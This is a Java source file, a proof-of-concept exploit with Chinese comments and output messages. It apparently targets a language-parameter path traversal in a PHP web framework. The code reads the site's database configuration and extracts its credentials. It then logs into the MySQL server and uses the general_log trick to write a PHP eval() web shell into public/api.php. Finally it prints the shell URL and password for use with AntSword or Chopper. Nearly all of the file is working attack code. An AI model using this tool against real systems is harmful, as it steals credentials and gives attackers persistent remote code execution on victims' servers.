package org.example;

import okhttp3.Response;
import org.example.utils.ArgsUtils;
import org.example.utils.MySQLUtils;
import org.example.utils.OkHttpUtils;

import java.net.*;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Poc {
    public String url= "";
    public String ip = "";
    static String payload_1 = "/index/ajax/lang?lang=..//..//application/database";

    public static String getRandomString(){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random=new Random();
        StringBuffer sb=new StringBuffer();
        for(int i = 0; i < 12; i++){
            int number=random.nextInt(52);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }

    public void setFuzzUrl(String url) throws UnknownHostException {
        this.url = url;
        // 定义用于匹配域名或IP地址的正则表达式
        String hostRegex = "https?://([\\w.-]+)(:\\d+)?";
        Pattern pattern = Pattern.compile(hostRegex);
        Matcher matcher = pattern.matcher(url);
        if (matcher.find()){
            String host = matcher.group(1); // 提取主机部分 (IP或域名)
            // 获取所有IP地址
            InetAddress[] inetAddresses = InetAddress.getAllByName(host);
            this.ip = String.valueOf(inetAddresses[0]).replace("/","");
        }
    }

    public Poc() {
    }

    public Poc(String url) throws Exception {
        this.url = url;
        // 定义用于匹配域名或IP地址的正则表达式
        String hostRegex = "https?://([\\w.-]+)(:\\d+)?";
        Pattern pattern = Pattern.compile(hostRegex);
        Matcher matcher = pattern.matcher(url);
        if (matcher.find()) {
            String host = matcher.group(1); // 提取主机部分 (IP或域名)
            // 获取IP地址
            InetAddress inetAddress = InetAddress.getByName(host);
            String ipAddress = inetAddress.getHostAddress();
            this.ip = String.valueOf(ipAddress).replace("/", "");
        }
    }

    public boolean TestAlive(){
        try {
            // 发送请求并获取响应
            Response response = OkHttpUtils.sendRequest(url);
            if (response.code() == 200) {
                System.out.println("\033[32;1m[+]Target:" + url + " is alive,IP is " + this.ip + "\033[0m");
                return true;
            }
        }catch (Exception ignored){

        }
        return false;
    }

    public void FuzzPayload_1() throws Exception {
        String urlFuzz_1 = this.url + payload_1;

        // 发送请求并获取响应
       Response response;
        try {
            response = OkHttpUtils.sendRequest(urlFuzz_1);
        }catch (Exception e)
        {
            System.out.println("\033[31;1m[-]无法连接:" + urlFuzz_1 + "\033[0m");
            return;
        }
        if (response.code() != 200){
            System.out.println("\033[31;1m[-]无法连接:" + urlFuzz_1 + "\033[0m");
        }
        else {
            String respText = response.body().string();
            // 定义正则表达式,匹配数据
            String regex = "\"(hostname|username|database|password|hostport)\":\\s*\"(.*?)\"";
            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(respText);
            Map<String,String> sqlMap = new HashMap<>();

            // 迭代查找匹配的字段和值
            while (matcher.find()) {
                String key = matcher.group(1);  // 字段名 (hostname, username, etc.)
                String value = matcher.group(2);  // 字段值 (localhost, root, etc.)
                sqlMap.put(key,value);
            }
            if (sqlMap.get("database") == null || sqlMap.get("username") == null ){
                System.out.println("\033[31;1m[-]" + "目标不存在文件读取漏洞!" + "\033[0m");
                return;
            }
            System.out.println("\033[33;1m[+]" +
                    "Host:" + sqlMap.get("hostname") +
                    ",Port:" + sqlMap.get("hostport") +
                    ",Database:" + sqlMap.get("database") +
                    ",Username:" + sqlMap.get("username") +
                    ",Password:" + sqlMap.get("password") + "\033[0m");
            Connection connection = MySQLUtils.TestConnect(this.ip,sqlMap.get("hostport"),sqlMap.get("database"),sqlMap.get("username"),sqlMap.get("password"));
            if (connection != null)
            {
                // 非批量验证时,尝试GetShell
                if (!ArgsUtils.ifRead){
                    // 创建 Statement 对象
                    Statement statement = connection.createStatement();
                    String version;
                    String basedir="";
                    String ShellCmd = getRandomString();
                    // 执行 SQL 查询：获取 MySQL 版本
                    String sql = "SELECT VERSION();";
                    ResultSet resultSet = statement.executeQuery(sql);
                    // 处理查询结果
                    if (resultSet.next()) {
                        version = resultSet.getString(1);
                        System.out.println("\033[32;1m[+]" + "目标数据库MySQL版本: " + version + "\033[0m");
                    }
                    sql = "select @@basedir;";
                    resultSet = statement.executeQuery(sql);
                    if (resultSet.next()) {
                        basedir = resultSet.getString(1);
                        System.out.println("\033[32;1m[+]" + "目标数据库根路径为: " + basedir + "\033[0m");
                    }
                    try{
                        String ShellPath = basedir.substring(0,basedir.indexOf("mysql")) + "www/public/api.php";
                        sql = "set global general_log = on;";
                        statement.execute(sql);
                        sql = "set global general_log_file = '" +  ShellPath + "';";
                        statement.execute(sql);
                        sql = "select '<?php echo eval($_POST[\"" + ShellCmd +"\"]);?>';";
                        statement.execute(sql);
                        sql = "set global general_log = off;";
                        statement.execute(sql);
                        System.out.println("\033[32;1m[+]" + "目标网站Shell已经写入\033[0m");
                        System.out.println("\033[32;1m[+]" + "使用蚁剑/菜刀连接:" + this.url + "api.php\tpassword:" + ShellCmd + "\033[0m");
                    }catch (Exception e){
                        System.out.println("\033[31;1m[-]" + "没有目标数据库的写入文件权限!" + "\033[0m");
                    }
                }else {
                    System.out.println("\033[34;1m[+]" + "目标数据库可远程连接!\033[0m");
                }
                connection.close();
            }
            else {
                if (sqlMap.get("database") != null && sqlMap.get("username") != null && sqlMap.get("username") != null){
                    System.out.println("\033[34;1m[-]" + "建议手工测试!" + "\033[0m");
                    return;
                }
                System.out.println("\033[31;1m[-]" + "目标数据库拒绝远程连接!" + "\033[0m");
            }
        }
    }

    public void Exp() throws Exception {
        if (TestAlive()){
            FuzzPayload_1();
        }
        else {
            System.out.println("\033[31;1m[-]无法连接:" + url + "\033[0m");
        }
    }
}